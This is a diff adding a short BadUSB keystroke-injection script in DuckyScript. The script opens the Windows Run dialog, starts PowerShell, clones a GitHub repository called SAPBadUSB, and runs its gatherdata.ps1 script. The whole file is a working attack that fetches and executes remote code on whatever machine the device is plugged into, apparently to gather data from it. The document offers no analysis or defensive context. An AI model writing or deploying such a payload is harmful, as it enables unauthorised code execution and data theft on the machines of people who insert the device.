@@ -1,0 +1,17 @@
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell 
+ENTER
+DELAY 1000
+STRING git clone https://github.com/JonathanStross/SAPBadUSB.git
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd .\SAPBadUSB\ps
+DELAY 1000
+ENTER
+DELAY 1000
+STRING .\gatherdata.ps1
+DELAY 1000
+ENTER
